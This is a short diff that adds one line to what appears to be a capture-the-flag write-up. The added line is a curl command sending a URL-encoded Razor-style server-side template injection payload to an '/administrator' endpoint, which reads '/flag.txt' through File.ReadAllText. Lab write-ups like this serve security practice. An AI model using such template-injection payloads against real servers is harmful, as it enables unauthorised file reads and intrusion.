@@ -10,3 +10,4 @@ no coded provided should be fine without your claud code
 
 ## Writeup
 
+curl -s "http://34.59.180.245:40098/administrator?template=%40%7B+var+f+%3D+File.ReadAllText%28%22%2Fflag.txt%22%29%3B+%7D%40f"
